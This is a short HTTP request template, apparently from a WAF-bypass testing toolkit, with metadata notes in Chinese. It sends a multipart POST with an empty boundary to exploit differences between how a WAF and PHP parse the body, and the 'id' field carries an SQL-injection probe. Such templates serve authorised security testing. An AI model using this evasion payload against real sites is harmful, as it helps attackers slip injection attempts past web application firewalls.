# @name: multipart空boundary
# @tags: post,multipart,empty-boundary,php,id,bypass
# @color: lavender
# @validate: baseline_similarity
# @threshold: 0.92
# @intent: multipart_empty_boundary
# @intent.param: id
# @intent.payload: id=1' and 'a'='a
# @note: Content-Type 中 boundary= 后为空值(并非分号后空格)，body 以空字符串作为 boundary 分隔。WAF 与 PHP 对空 boundary 的容错不同，可造成解析不一致。参考 do9gy multipart Part1 第8条。
POST / HTTP/1.1
Host: {{TARGET_HOST_HEADER}}
User-Agent: {{USER_AGENT}}
Content-Type: multipart/form-data; boundary=

--
Content-Disposition: form-data; name="id"

1' and 'a'='a
--
